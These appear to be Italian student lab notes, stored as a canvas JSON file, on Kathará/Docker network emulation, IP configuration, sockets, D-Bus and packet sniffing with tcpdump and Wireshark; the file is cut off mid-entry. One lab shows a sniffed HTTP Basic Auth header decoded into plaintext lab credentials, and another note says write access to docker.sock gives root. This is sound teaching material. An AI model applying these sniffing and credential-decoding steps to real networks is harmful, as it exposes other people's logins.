{
	"nodes":[
		{"id":"c43c09b5a27c6f80","type":"text","text":"# Katharà\n\nCon Docker, creiamo un `container` per ogni nodo virtuale, dopodiché definiamo una rete di tipo `bridge` personalizzata con cui connettere i vari nodi. Questo crea uno schema di packet switching tra ambienti Docker, che di fatto simula una rete.\n\nAbbiamo sostanzialmente descritto il principio di funzionamento di ***Katharà***.\n\nPartiamo da una cartella in cui siano presenti i file di configurazione\n\n- `lab.conf`, che definisce il ruolo dei vari elementi di rete (e.g. router o pc). Prendendo come esempio `~/pnd-labs/lab1/ex1` abbiamo\n\t- Una breve descrizione dell'attività da svolgere, esplorata meglio nel `file` `README`;\n\t- Una serie di direttive che definiscono il comportamento e la topologia della rete, nella forma `nodo[specifica] = valore`. Abbiamo ad esempio\n\t\t- `r1[0] = 'A'`, i.e. il nodo `r1` è connesso tramite l'interfaccia `0` (che sarebbe `eth0`) alla rete che chiamiamo `A`;\n\t\t- `r1[bridged]=true`. Questo potrebbe far pensare alla rete `bridge` di `docker` (e che quindi questa direttiva stia dicendo che `r1` è connesso agli altri nodi), ma non è così. Questa è una ***modalità bridged*** propria di Katharà, i.e. è come se estendesse il cavo ethernet connettendo anche `r1` alla rete. Da fuori, `r1` viene interpretato come `host` reale connesso sulla stessa interfaccia dell'`host` principale;\n\t\t- `r1[sysctl]=\"net.ipv4.ip_forward=1\"`. Con questa direttiva, Katharà modifica il kernel simulato del nodo `r1` dicendogli di abilitare il `forwarding IPv4`. In pratica, sto dicendo al nodo `r1` di comportarsi da `router IPv4`;\n\t\t- `r1[sysctl]=\"net.ipv6.conf.all.forwarding=1\"`, i.e. l'analogo per `IPv6`;\n\t\t- `pc{1,2,3}[0]=\"A\"`, i.e. l'interfaccia `eth0` dei nodi `pc{1,2,3}` è connessa alla rete `A`. Questa sottorete è quindi composta da tre `pc`.\n- `*.startup`, che definiscono le configurazioni iniziali dei vari elementi di rete, i.e. i comandi eseguiti in `startup` dei nodi (poi mostrati come `log` all'avvio dei terminali).\n\nA questo punto possiamo fare `kathara lstart`, o sfruttiamo l'`alias` `lstart`, se presente. Questo fa partire la simulazione e ci fornisce i terminali per ogni nodo definito in `lab.conf`.\n\nIn modo analogo possiamo riavviare l'ambiente se qualcosa non va (`lrestart`), fermare tutto (`lclean`) o forzare la pulizia dell'ambiente se abbiamo bloccato tutto (`kwipe`).","x":-9320,"y":7440,"width":759,"height":924,"color":"6"},
		{"id":"28ffaf4f75ea584b","type":"text","text":"# Virtual Machines e Containers (Docker)\n\nTutta questa roba gira su una VM, perché simulare un kernel anziché modificare quello della propria macchina è sempre una scelta safe. Tutto questo ci isola completamente dal SO nativo della macchina. Detto questo, all'interno della VM lavoriamo in un ambiente isolato a livello di processi, detto ***container***. In particolare, usiamo ***Docker***.\n\nDocker è un servizio di sistema il cui demone (`dockerd`) parte all'avvio del SO. Il suo scopo è quello di permettere all'utente di creare e gestire i container, ambienti virtuali in cui gruppi di processi vengono isolati dai restanti (a livello tecnico, questo avviene con le funzioni `namespace` e `cgroups` del kernel Linux, ma non ci addentriamo).\n\nDiversi gruppi di processi (i.e. diversi container) hanno in generale diverse necessità di comunicazione. Pertanto, Docker configura di default (prima ancora di creare il primo container!) tre tipologie di reti (visualizzabili con `sudo docker network list`):\n\n- `bridge` - Una rete predisposta a collegare tra di loro i vari container ad essa connessi. Questo non li connette direttamente ad Internet. Funziona in modo simile ad un ***NAPT***, quindi se voglio farli accedere alla rete esterna devo fare ***port mapping***;\n- `host` - Rimuove l'isolamento di rete del container. Questo condivide quindi l'indirizzo `IP` dell'host e usa la sua stessa interfaccia di rete: se apre una porta, lo fa direttamente sul sistema host. Usato per evitare l'overhead di virtualizzazione di rete;\n- `none` - Al container configurato con questa rete è impedita qualsiasi comunicazione, i.e. non ha alcuna interfaccia di rete. Usato generalmente per le sandbox.\n\nSi possono poi creare ulteriori reti personalizzate con `sudo docker network create`.\n\nTutto molto bello, ora però tocca creare un container. Come?\n\nIn pratica, Docker si comporta come se fosse una sorta di server interno al SO. Ha un file ***socket*** (`/var/run/docker.sock`) gestito dal demone `dockerd`: chi vuole creare un nuovo container deve mandare la richiesta al socket, e può farlo solo se sta nel gruppo `docker`, l'unico ad avere i giusti permessi sul socket stesso (oltre ovviamente a `root`).\n\n<span style=\"color:rgb(236, 155, 14)\">**Attenzione:** Chi può scrivere su `/var/run/docker.sock` può **controllare tutto Docker**, il che equivale ad avere accesso **root senza password**.</span>\n","x":-9320,"y":6335,"width":759,"height":870,"color":"4"},
		{"id":"2d824d6131fce094","type":"text","text":"# Laboratorio 1 - `IPv4` & Packet Sniffing\n\n### `Ex1`\n\nFacciamo `lstart`. Si aprono `4` terminali corrispondenti ai nodi di rete da configurare, che mostrano i `log` delle operazioni già effettuate su di essi (entrambi questi comportamenti, i.e. apertura automatica dei terminali e stampa dei `log`, sono configurabili in `kathara settings`). In particolare,\n\n- ai `pc` viene preventivamente annullata ogni configurazione di `IP` sull'interfaccia `eth0` con il comando `ip addr flush eth0`: andrà settata manualmente;\n\t- Ogni nodo viene creato simulando una macchina con una scheda di rete, quindi ogni nodo possiede a priori un'interfaccia `eth0`.\n- `r1` viene effettivamente settato da `router`:\n\t- `ip addr replace 192.168.100.30/29 dev eth0` - Qualunque configurazione ci fosse prima, il tuo nuovo indirizzo su `eth0` è `192.168.100.30`. Inoltre, da `eth0` puoi raggiungere tutta la sottorete con `subnet mask 255.255.255.248`, i.e. tutti gli indirizzi che vanno da `192.168.100.24` (che identifica la rete, se ti fai i conti ha tutti `0` come parte `host`) a `192.168.100.31` (che è invece il `broadcast`, parte host di tutti `1`). Quindi `.30` è l'ultimo indirizzo utilizzabile, ed è stato assegnato al `router`. Restano come potenziali `host` gli `IP` che vanno da `.25` a `.29`;\n\t- `iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE` - `r1` sarà connesso ad Internet tramite `eth1`, e su tale interfaccia eseguirà un `NAPT` per mascherare gli `IP` di tutte le altre sottoreti (in questo caso solo `eth0`);\n\nA questo punto, per settare una configurazione di rete funzionante servono quattro elementi: `IP`, `netmask`, `IP` del `default gateway` e `IP` del `server DNS`. Ci sono tre modi per farlo.\n\n1. `interfaces` (`pc1`) - Tutte  le informazioni vengono messe su un unico file, i.e. `/etc/network/interfaces.d/eth0` (sarebbe `/etc/network/interfaces`, ma se lo apri ti rendi conto che semplicemente prende le configurazioni dai file presenti nella cartella `interfaces.d`). Ci devi scrivere una roba del tipo\n\n```python\nauto eth0                                     # Attiva eth0 all'avvio (altrimenti dovrei sempre farlo io manualmente con `ifup eth0`)\niface eth0 inet static                        # Specifica l'interfaccia in modo statico\n\taddress 192.168.100.25/29                 # Definisce l'IP e la subnet mask\n\tgateway 192.168.100.30                    # Il router r1 è il default gateway\n\tdns-nameservers 151.100.4.2 151.100.4.13  # Quelli definiti da r1, ma potrei in linea di principio mettere quelli che voglio\t\n```\n\n- Se non ti ricordi la sintassi, `man interfaces`. Per rendere effettivi i cambiamenti devo far leggere al kernel questo nuovo file `interfaces` aggiornato, con il comando `ifup eth0` (`ifup` va a cercare `eth0` dopo una definizione di `iface` nel file di configurazione). Per spegnere l'interfaccia, `ifdown eth0`.\n\t- Di norma `ifup` aggiorna automaticamente il file `/etc/resolv.conf`, dove vengono salvati gli indirizzi dei `server DNS`. Questo non succede se si usa Docker, <span style=\"color:rgb(236, 155, 14)\">perché `ifup` non ha i permessi per farlo</span> (e comunque verrebbe resettato ad ogni riavvio dell'ambiente Katharà). Va fatto a mano.\n\n2. `ip` (`pc2`) - I primi due si settano con `ip add`, il `default gateway` con `ip route` e il `DNS` va scritto a mano nel file `/etc/resolve.conf`;\n\n3. `ifconfig` (`pc3`) - È la vecchia versione del comando `ip`, quindi in modo analogo (con `route` al posto di `ip route`.... perché `ip` non c'era).\n\n### `Ex2`\n\nLa stessa cosa di prima, ma con `DHCP`.\n\n- `r1` va settato `server DHCP`. Si può fare con `udhcpd`, che ha un file `/etc/udhcpd.conf`. Dopo aver settato tutto (in fondo ci sta altra roba, occhio!) lo si lancia con `udhcpd -f /etc/udhcpd.conf` (lato client invece è `dhclient`). Qui per comodità invece di scrivere i comandi bash per modificare `udhcpd.conf` in `r1.startup` possiamo mettere il file di configurazione direttamente già scritto in `pc1/etc/udhcpd.conf`, `r1` lo caricherà direttamente all'avvio;\n\t- <span style=\"color:rgb(236, 155, 14)\">Questo è vero, ma sembra che la configurazione venga caricata sul nodo virtuale ***dopo*** che vengono eseguiti i comandi di startup. O meglio, se in `r1.startup` cerchi `udhcpd.conf` nel filesystem (tipo con `ls`) lui te lo trova, ma `udhcpd -f /etc/udhcpd.conf` eseguito subito dopo tra i comandi di `r1.startup` restituirà un errore di tipo \"`file non trovato`\". Boh, non voglio indagare, ci ho perso già troppo tempo. Tocca avviare il server a mano, altrimenti partirà con le impostazioni predefinite, quindi con i range di indirizzi sbagliati, e in pratica non funzionerà nulla</span>;\n- `pc1` di nuovo con `interfaces` (`iface eth0 inet dhcp`);\n- `pc2` con `dhclient`\n\n### `Ex3`\n\nQui tocca configurare due router. Tre, in realtà: bisogna mettere al router di frontiera le regole per raggiungere le reti interne.\n\nVisto che inizia ad esserci un botto di gente collegata ha senso iniziare a creare delle associazioni `IP-Hostname` in modo da non dover ogni volta scrivere `ping 172.16.1.2`. Questa roba si fa scrivendo nel file `/etc/hosts` coppie di tipo `172.16.1.1 lan1pc1` e simili. Gerarchicamente sta sopra DNS, i.e. queste associazioni vengono preferite a qualsiasi cosa dica il servizio di risoluzione dei nomi.\n\nOra aggiungiamo il ***packet sniffing***. Tramite `tcpdump` possiamo osservare il traffico direttamente da CLI, ad esempio\n\n- Eseguiamo `tcpdump -vvv` (molto `verbose`) su `lan1pc1` (dovrei a rigore mettere `-i eht0`);\n- Eseguiamo `ping lan1pc1` su `lan2pc2`.\n\nOltre agli ovvi messaggi `ICMP` e `ARP` (perché in ogni caso le entries della `ARP Table` hanno un `TTL` oltre il quale vengono cancellate), notiamo anche le richieste per una ***reverse DNS lookup***, i.e. una ricerca `DNS` \"al contrario\" in cui dispongo di un `IP` ma non del nome associato. In questo caso succede perché gli abbiamo detto `nameserver 8.8.8.8`, ma non il nome di questo `IP`:\n```python\ndns.google.domain > lan1pc1.54520: [udp sum ok] 9244 q: PTR? 8.8.8.8.in-addr.arpa. 1/0/0 8.8.8.8.in-addr.arpa. [23h36m6s] PTR dns.google.\n```\n\n`dns.google.domain` risponde a `lan1pc1` sulla porta `54520` con un pacchetto `UDP` non corrotto (il `checksum` è `ok`) per la richiesta `#9244` che chiede una `reverse DNS query` (`PTR?`, che a quanto ho capito sta per `pointer`) su `8.8.8.8` (il suffisso `.in-addr.arpa.` è uno standard per intendere che quello a cui è attaccato è l'oggetto della `reverse DNS query`). Seguono il `TTL` e la risposta col nome (`PTR dns.google.`). Nota che tutti questi messaggi vengono visti ugualmente in chiaro da `lan1pc2`, in quanto connesso alla stessa LAN priva di switch.\n\nSegue ***Wireshark***. Per capire come configurarlo (e perché) cfr. `Wireshark` su `Katharà`.\n\n### `Ex4`\n\nQui l'idea è catturare il traffico di un `local webserver`. La topologia di rete prevede che `pc1` sia connesso su due reti: `172.17.0.2/16` è dovuto alla direttiva `pc1[bridged]=true`, il che è un `bridge Docker` che lo collega al resto del mondo (i.e. alla VM sottostante, che è a sua volta connessa al SO sottostante, che è a sua volta connesso ad Internet), mentre `10.0.0.1/24` è la `LAN A`. Se eseguiamo `connect-lab.sh 10.0.0.100/24 lanA` siamo connessi con la VM su una `LAN` su cui è in ascolto un server sulla `porta 80`: possiamo fare richieste `HTTP` da `Firefox` (o qualsiasi altro `browser`) e sniffare con `Wireshark`.\n\nSniffiamo i pacchetti scambiati chiedendo da `browser` la pagina `http:://10.0.0.1/ba.php`, che implementa una `Basic Authentication`. Vediamo lo scambio `SYN - SYN ACK - ACK` per l'`handshaking TCP`, la `GET` per il contenuto della pagina, dopodiché ho sbagliato a mettere la `password`, quindi mi ha rifiutato con codice `401` e ha chiuso la connessione con le varie `FIN ACK`. Se invece ci limitiamo a visualizzare la pagina `10.0.0.1`, `TCP` manterrà la connessione attiva scambiando periodicamente dei `Keep-Alive`. Se metto la giusta `password` cambia poco, semplicemente il codice diventa `200` e non vedo nient'altro: l'autenticazione è per definizione inclusa nella richiesta `GET`. Su `Wireshark`, posso selezionare un pacchetto `HTTP` e da tasto destro scegliere `Follow > HTTP (or TCP) Stream`. Questo mostra la ricostruzione del flusso di messaggi effettivi scambiati da quella connessione, ne riporto esempi a sinistra. Stesso dicasi per la pagina `da.php` che implementa la `Digest Authentication`.\n\nDopodiché chiede la stessa cosa con `FTP`, i.e. dal `pc1` eseguo `ftp test.rebex.net` mettendo credenziali `demo:password`. Nota che così `pc1` va su Internet senza passare per la `lanA`, quindi o guardo con `Wireshark` direttamente al traffico in uscita dalla VM oppure catturo su `pc1` con `tcpdump`, salvo su `shared` e poi apro con `Wireshark`. Notiamo alcune cose: `FTP` è un protocollo stateful, i.e. la connessione resta aperta finché non la chiudiamo, e separa il flusso di comandi ed il flusso di dati, e.g. visibile se chiamiamo una funzione `get`. Inoltre, sempre con la `get`, notiamo che un singolo comando nella nostra interfaccia client esegue diverse richieste a livello di pacchetti `FTP`.\n\nInfine, facciamo la stessa cosa con `SFTP` e notiamo che si appoggia su `SSHv2`, motivo per cui risulta tutto crittato.","x":-9570,"y":8600,"width":1259,"height":2425,"color":"4"},
		{"id":"6dcfdc201d597c93","type":"text","text":"# alternativa\n\ninvece di mettere i comandi bash in .startup, posso mettere i file di configurazione in pc1/etc/network/eccetera, e mettere in pc1.startup la linea `etc/init.d/networking restart`\n\nNOOO NON CREDO, CAPIRE MEGLIO\n\n\nse devo copiare un file da dentro un nodo (e.g. r1) a fuori, nel terminale standard `docker cp r1:/path/to/file ./file.conf`\n","x":-4280,"y":9305,"width":557,"height":367},
		{"id":"9c512660e25af682","type":"text","text":"# `AF_UNIX` - Inter-Process Communication (IPC)\n\nSe vuoi costruire condivisione di informazioni tra processi in modo più sofisticato rispetto ad un file condiviso o a semplici segnali, puoi usare una sorta di paradigma ***client-server*** che si appoggia sui ***Bus*** e che su di essi apre dei ***Socket UNIX*** (`AF_UNIX`).\n\nSi può fare un'analogia con le reti:\n\n- Il `bus` è l'analogo di ***Internet***: tutti si possono collegare ad esso per inviare o per ricevere messaggi. Ne abbiamo diversi (e.g. `session` per i processi utente, `system` per quelli di sistema), e in pratica costituisce l'architettura della \"LAN\";\n- I processi che vogliono inviare/ricevere messaggi sono l'analogo di ***client e server***. Servono quindi due cose:\n\t- Ad ogni processo connesso al `bus` viene assegnato un nome univoco temporaneo (e.g. `:1.42`) che funge da ***indirizzo IP***. Se però il processo (e.g. `standardservice`) offre un servizio molto specifico (e.g. `Sum`) può scegliere di esporsi alla \"LAN\" usando come identificativo un ***well-known-name*** che richiama un \"well-known-service\" (e.g. `standardservice.Sum`). Questo significa che gli altri processi possono accedere ai servizi standard indipendentemente da chi è lo specifico processo che lo implementa (sarebbe un disastro con i nomi casuali!);\n\t\t- In pratica, `org.freedesktop.NetworkManager` è un well-known-name di un processo che si pubblicizza come `NetworkManager` e che offre metodi come `ActivateConnection(parametri)` e `GetActiveConnections()` secondo gli standard definiti da `org.freedesktop` (essendo i nomi gerarchici come `DNS`, visitando il sito `freedesktop.com` ti rendi conto che è letteralmente un progetto che definisce standard per cose su `UNIX`);\n\t\t- Con un ***codice malevolo*** potrei pubblicizzarmi come voglio e fare quello che voglio? ... ***ni***. `DBus` ha delle contromisure, messe in atto da `dbus-demon`. Ad esempio, per presentarti come `NetworkManager` ti servono le autorizzazioni;\n\t\t- Il nome casuale `:1.42` è gestito in modo incrementale per evitare conflitti.\n\t- Dopo l'`IP`, su `TCP/IP` mi serve la ***porta***. Ma l'obiettivo è solo quello di identificare un servizio offerto! Segue che qui l'analogo delle porte sono i metodi esposti dal processo che si pubblicizza sul `bus`. In pratica uso il nome del servizio e attacco in coda il metodo (e.g. `org.freedesktop.NetworkManager.GetActiveConnections`).\n- In `TCP/IP`, La coppia `IP/Porta` crea di fatto un ***socket***. Qui è leggermente diverso. Il demone `dbus` crea un socket associato al bus e si propone come server per tutti i processi. I processi si connettono come client e specificano chi vogliono raggiungere (tramite well-known-name o nome univoco temporaneo). Di fatto, per mantenere il parallelismo con `TCP/IP` per ogni connessione tra due processi abbiamo in realtà due connessioni client-server (`Processo A - dbus` e `dbus - Processo B`). Di fatto, quindi, `dbus` fa sia (de)multiplexing sia \"***routing***\".\n\nQuesto era per rispondere a \"uuh cosa sono tutte queste cose quando eseguo `ss -x`?!\".\n\nE fu così che non si laureò mai...","x":-6043,"y":8600,"width":759,"height":1105,"color":"4"},
		{"id":"394c80713ed11e62","type":"text","text":"# Address Families & Tipi di Socket\n\nAbbiamo capito che un ***socket*** è un'astrazione generale per la comunicazione. A seconda del tipo di comunicazione, possiamo trovare diverse ***famiglie di socket***. Quando ad esempio apro un socket `UDP` in `python` tramite la libreria `socket` e il comando\n\n```python\nclientSocket = socket(AF_INET, SOCK_DGRAM)\n```\n\n`AF_INET` sta dicendo che questo `socket` sarà usato per comunicare su `IPv4` (`AF_INET6` avrebbe usato `IPv6`), e `SOCK_DGRAM` significa protocollo `UDP`. \n\nSi può intuire che esistono un botto di famiglie di socket. Per citarne alcune:\n\n- `AF_INET(6)` - Usata per ricevere messaggi applicazione basati su `TCP/IP`;\n- `AF_PACKET` - Usata per ricevere frame Ethernet grezzi (cfr. ***Packet Sniffing***);\n- `AF_NETLINK` - Usata per la comunicazione User-Kernel (i.e. ***system call***);\n- `AF_UNIX` (o `AF_LOCAL`) - Usata per implementare ***Inter-Process Communication*** (***IPC***);\n- `AF_BLUETOOTH` - Autoesplicativo. Ci sono in generale tante famiglie di socket quanti sono i protocolli di comunicazione.\n\nA volte al posto del prefisso `AF_` (`Address Family`) si usa `PF_` (`Protocol Family`). In teoria il primo si usa a livello astratto (i.e. quando lo chiamo nel codice), mentre con il secondo si indica la sua implementazione all'interno del `kernel`. In pratica, sono sinonimi.","x":-7052,"y":8853,"width":759,"height":600,"color":"6"},
		{"id":"6f55ee57ba880979","type":"text","text":"# `ps` & `ss` (`Processi` e `Socket`)\n\nIl comando `ps` (`Process Status`) serve a visualizzare i ***processi*** in esecuzione. Eseguito senza ulteriori opzioni mostra tutti i processi legati alla `shell` corrente (simile a `jobs`, ma quest'ultimo mostra solo quelli in background). Dopodiché abbiamo\n\n- `-e` (analogo a `--all`) - Mostra tutti i processi;\n- `-f` - Mostra il formato completo (`PPID`, `CPU Time`, ...);\n\t- `-l` estende ulteriormente.\n- `-u user` - Mostra solo i processi dell'utente `user`;\n- `-p PID` - Mostra i dettagli del processo con un certo `PID`;\n- `-t tty` - Mostra i processi associati ad uno specifico terminale `tty`;\n- `a` - Mostra i processi di tutti gli utenti con un terminale attivo;\n- `x` - Mostra anche i processi senza terminale, ma dell'utente corrente;\n\t- `ax` mostra tutti i processi, come `-e` e `--all`.\n- `u` - Estende le informazioni (mostra più colonne).\n- `f` (analogo a `--forest`) - Mostra l'albero gerarchico dei processi;\n- `--sort=-%XXX` - Ordina secondo `XXX = cpu` (uso della `CPU`) o analogo con `mem`.\n\nGiocando con questa roba potresti ad esempio accorgerti che c'è un processo, i.e.\n```\n/lib/systemd/systemd --user\n```\nche è il padre di tutti i processi utente. Questo perché gestisce `systemctl --user`, i.e. ti permette di usare i servizi nello spazio utente. Con `ps --forest -u user` puoi vedere rapidamente tutti i servizi attivi di `user`.\n\nIl comando `ss` (`Socket Statistics`) ispeziona invece tutte le possibili ***connessioni***.\n\n- `-a` - Mostra tutti i socket\n- `-t`, `-u` - Filtra, rispettivamente, le sole connessioni `TCP`/`UDP`;\n- `-x` - Filtra le sole connessioni `UNIX`, cfr. ***Inter-Process Communication (IPC)***;\n- Oltre a queste due macro-categorie (`TCP/UDP` e `UNIX`) ne esistono altre:\n\t- `RAW` - Accesso diretto a `IP`. Alcuni comandi (e.g. `ping`, `tcpdump` e i firewall) non usano il livello di Trasporto;\n\t- `FRAG` - Usata per gestire i `frammenti IP` non ancora ricomposti;\n\t- `INET` - Generica connessione di rete, i.e. qualsiasi cosa non meglio specificata che coinvolga `IP` (e che quindi non sia locale, come invece è una connessione `UNIX`).\n- `-l` - Mostra solo i socket in ascolto;\n- `-n` - Mostra gli `IP` in formato numerico (non risolve i nomi);\n- `-p` - Mostra il nome del processo associato al socket;\n- `-s` - Mostra un riassunto statistico delle connessioni.","x":-8061,"y":8600,"width":759,"height":1105,"color":"4"},
		{"id":"5ddd43db34c02b27","type":"text","text":"# `Wireshark` su `Katharà`\n\n`tcpdump` mostra le cose in modo \"straightforward\" da linea di comando, mentre per usare Wireshark serve una GUI. Visto che i terminalini non ce l'hanno, dobbiamo usarlo sulla VM, al di fuori dell'ambiente Katharà. Eh ok, ma allora come faccio a sniffare i pacchetti? Semplice, creo un collegamento ***ethernet virtuale*** (`veth0`) che collega una mia interfaccia sulla VM alla `LAN` simulata da docker. Come? Con lo script `connect-lab.sh`! Come?\n\n- Creo le due interfacce virtuali, i.e. gli estremi del cavo ethernet virtuale (`sudo ip link add veth1 type veth`).\n\t- \"Ma hai specificato solo `veth0`, ti manca un'interfaccia!\". No, non manca, la genera il SO in automatico dandole un nome coerente (e.g. `veth0`);\n\t- Puoi specificare esplicitamente entrambi i nomi con `ip link add dev veth0 type veth peer name veth1`.\n- Assegno a `veth0` l'`IP` passato come primo argomento (`sudo ip addr add $1 dev veth0`);\n\t- Ovviamente devo dargli un indirizzo coerente con la LAN a cui mi sto attaccando (e.g. se voglio andare sulla LAN `internal` dell'`Ex3` ha senso scegliere un indirizzo tipo `172.16.254.10/24`).\n- A questo punto devo rendere `veth1` una delle \"porte\" della LAN creata da Katharà. Uso questo termine perché questa rete è un `bridge`, i.e. si comporta da ***switch virtuale*** (è ragionevole che una LAN virtuale si comporti da switch, altrimenti sarebbe come collegare tutto su un singolo cavo ethernet). Per farlo, servono due step:\n\t- Anzitutto devo ***trovare la LAN*** tra quelle che risultano come output di `sudo docker network ls | grep -e 'kathara_.*'`. Lo script prevede un secondo parametro opzionale per specificarne il nome. Se non specifico nulla, lo script assume che ce ne sia solo una e prende la prima;\n\t- Una volta trovata, eseguo l'accoppiamento ***master/slave*** vero e proprio (`sudo ip link set veth1 master kt-${bridge}`).\n\t\t- Una `master interface` (e.g. la LAN creata da Katharà) è un dispositivo che gestisce altre interfacce subordinate (`slave`, e.g. `veth1`).\n- Infine, attiviamo le interfacce con `ip link set vethX up`.\n\nQuindi, dopo aver settato la rete facciamo `./connect-lab.sh 172.16.254.10/24 internal`, e vediamo se funziona provando a mandare un ping.\n\n... o meglio, sarebbe bello riuscire a rilevare la presenza di uno ***sniffer passivo*** in modo così semplice. La verità è che è quasi impossibile, perché questo non ha motivo di rispondere a nulla. Esistono tecniche per provare a individuare messaggi anomali che possano tradirne la presenza (e.g. mando pacchetti ad indirizzi inventati, lo sniffer vede questi `IP` che non conosce e prova a fare un reverse DNS lookup per capire chi sono, io sniffo a mia volta e vedo tali pacchetti), ma resta un compito difficile.","x":-8061,"y":11248,"width":759,"height":1105,"color":"4"},
		{"id":"52efa23b596ae1eb","type":"file","file":"Area Lab1 - IPv4/DigestAuthenticationSniffing.png","x":-12601,"y":11918,"width":759,"height":270},
		{"id":"ca3cf448e10d4a7f","type":"file","file":"Area Lab1 - IPv4/BasicAuthenticationSniffing.png","x":-12601,"y":11545,"width":757,"height":138},
		{"id":"58ca04dd8eff3556","type":"text","text":"# Flussi `HTTP` per l'`ex4`\n\nSeguendo il flusso `HTTP` creo un Display Filter visibile in alto che segue lo stream.\n\n```http\nGET /ba.php HTTP/1.1\nHost: 10.0.0.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nAuthorization: Basic YW5nZWxvOmFuZ3Nw\n\nHTTP/1.1 200 OK\nDate: Sun, 11 May 2025 11:42:09 GMT\nServer: Apache/2.4.62 (Debian)\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 186\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html; charset=UTF-8\n\n<html><p>Welcome angelo.</p><p>You entered the right password.</p><script>\necc..\n```\n\nNota che ci vuole poco ad eseguire `echo \"YW5nZWxvOmFuZ3Nw\" | base64 -d` ottenendo le credenziali in chiaro `angelo:angsp`. Lo fa addirittura `Wireshark` in automatico, se si ispeziona il campo `Authorization` della `GET` in basso a sinistra.\n\nCon Digest Access abbiamo invece un paio di campi diversi:\n\n```http\nCookie: login=True\nAuthorization: Digest username=\"angelo\", realm=\"Practical Network Defense - Sapienza\", nonce=\"6820908f7e06f\", uri=\"/da.php\", response=\"7260861f7b5869a9d1e2b3c1a3cb515a\", opaque=\"4de400b4078c41f5985fae0ffb6511cc\", qop=auth, nc=00000001, cnonce=\"fa342f2c9fc532aa\"\n```\nOvviamente questo manda l'username in chiaro, il che non ci piace molto.","x":-11592,"y":11248,"width":759,"height":1105,"color":"4"},
		{"id":"e0222f3875abd212","type":"text","text":"# Wireshark & Deep Packet Inspection (DPI)\n\nWireshark sfrutta `dumpcap` e i ***BPF*** (***capture filters***) per fare packet sniffing, dopodiché vi costruisce al di sopra una potente analisi dati. Ciò include tutto ciò che fa già `tcpdump` (i.e. interpretazione degli header), ma aggiunge svariati altri layer di decodifica.\n\n- ***Riassemblaggio IP*** - Ricostruisco i pacchetti `IP` frammentati per avere payload \"interi\";\n\t- Se si utilizza `IPsec`, il \"vero\" `header IP` è crittato insieme al resto del messaggio. In ogni caso, l'`header` di `IPsec` stesso deve comunque essere in chiaro.\n- ***Riassemblaggio TCP*** - Di norma l'`header` di Trasporto è in chiaro. Posso quindi capire se sotto `IP` c'è una connessione `TCP`, e in caso ricostruirne il flusso. Wireshark simula quindi un client `TCP`, perché riordina i segmenti (e.g. ritrasmissioni, ricezioni out-of-order) e distingue le varie connessioni. Alla fine di questa fase ottengo una \"full picture\" di chi parla con chi;\n- ***Decrittazione*** (***Opzionale***) - A questo punto c'è il problema ***TLS***, i.e. il payload potrebbe essere crittato. Se sono in possesso di chiavi (cosa tutt'altro che scontata), qui posso decodificare il contenuto dei segmenti riassemblati;\n- ***Deep Packet Inspection*** - Qui usiamo i ***dissectors***, i.e. pezzi di SW che guardano la porta di destinazione e leggono l'`header` Applicazione che segue assumendo sia quello del protocollo standard su quella porta (e.g. una connessione sulla porta `80` verrà interpretata in automatico come protocollo `HTTP`).\n\t- Ovviamente questa cosa è stupida, nel senso che posso connettermi sulla porta `80` in `SSH`, o qualsiasi altro protocollo. Wireshark proverà comunque ad interpretare con il protocollo standard, a meno che dall'alto qualcuno non gli dica \"`leggi la roba sulla porta 80 come se fosse SSH`\";\n\t- Su porte non standard può usare delle ***euristiche*** per inferire il protocollo;\n\t- Questa cosa ovviamente è più facile se la connessione è in chiaro o se avevo le chiavi, un po' meno altrimenti. Se c'è un layer di crittografia, posso vedere solo l'`header TLS`. Se sono fortunato e becco l'***handshake*** posso vedere i protocolli supportati dal client (messaggio di `ClientHello`) e/o quello scelto dal server (con la risposta, `ServerHello`), altrimenti ho solo la versione di `TLS`. Il resto del payload è comunque crittato, e risulterà genericamente come `Application Data`.\n\nA questo punto Wireshark ha tutto il necessario per implementare\n\n- ***Analisi Esperta*** - Calcolo di statistiche aggregate (e.g. protocolli applicazione più usati, ma anche grafici, gerarchie di protocolli e tempi di risposta) ed anomalie. Se i dati sono crittati, si limita ad errori di riassemblaggio `IP` e `TCP`;\n- ***Estrazione di Oggetti*** - Se i payload trasportano dati relativi a file, questo modulo li scarica. Ovviamente se i dati sono crittati sta roba non funziona;\n- ***Display Filters*** - Lo strato finale che permette di interagire con le informazioni raccolte. Posso scegliere di visualizzare solo i dati di un certo tipo (e.g. `http.request.uri`), a patto ovviamente che Wireshark sia stato in grado di risolvere o decrittare quello specifico `header` (e.g. `tls.handshake.type` sarà sempre in chiaro).","x":-8061,"y":9920,"width":759,"height":1105,"color":"4"},
		{"id":"780a7728bf920c66","type":"text","text":"# Packet Sniffing\n\nDi norma, una NIC scarta tutti i pacchetti che non sono diretti al suo `MAC Address`. Quelli \"validi\" vengono mandati al modulo del `kernel` che implementa le funzioni della stack `TCP/IP`. Qui si scarta la carta fino al livello di trasporto, e il risultato viene mandato al giusto socket `AF_INET` (e.g. un socket UDP).\n\nPosso però ordinare alla NIC di non scartare i pacchetti destinati agli altri, impostandola in ***promiscuous mode*** tramite il suo driver (lo scarto avviene a livello HW). Questo però di per sé non cambia molto, perché il `kernel` decapsula e non trova nessun socket `(IP, porta)` che corrisponde (banalmente, l'`IP` non è il tuo).\n\nLa soluzione è aprire un socket `AF_PACKET` tra la NIC e il `kernel`, che quindi riceve i dati grezzi Ethernet prima che questi vengano spacchettati.\n\nLe funzioni per realizzare tutto questo sono scritte in `C` nella libreria `libpcap`. Tramite le sue API, un processo può realizzare la cattura dei pacchetti. Ciò avviene in\n\n- `dumpcap`, che si limita a salvare i dati grezzi in un file `.pcap`;\n- `tcpdump`, che fa anche la ***decodifica*** e stampa su terminale.\n\n***Wireshark*** (o il uso equivalente CLI `tshark`) fornisce un potente sistema di decodifica (***Deep Packet Inspection***), filtraggio e interfaccia grafica appoggiandosi su `dumpcap`.\n\nPer analisi di più alto livello, SW come ***nfsen*** e ***Zeek*** producono dei quadri complessivi ad alto livello ed in tempo reale della situazione (e.g. chi parla con chi, quando e tramite cosa). 